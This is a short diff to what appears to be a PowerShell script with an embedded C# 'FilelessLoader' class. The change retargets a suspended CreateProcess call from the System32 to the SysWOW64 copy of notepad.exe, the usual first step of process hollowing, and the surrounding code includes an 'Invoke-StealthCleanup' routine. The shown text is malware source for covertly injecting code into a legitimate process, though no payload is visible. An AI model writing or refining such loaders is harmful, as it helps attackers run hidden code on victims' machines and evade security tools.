@@ -111,7 +111,7 @@ public class FilelessLoader {
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             
             // 0x4 = CREATE_SUSPENDED
-            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            bool success = CreateProcess(@"C:\Windows\SysWOW64\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
             
             if (!success) { 
                 Console.WriteLine("[-] Failed to create process. Error Code: " + Marshal.GetLastWin32Error()); 
@@ -188,3 +188,4 @@ Invoke-StealthCleanup
 # [FIX] Pause so you can read the screen before it closes
 Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
 Read-Host "Press ENTER to close this window..."
+
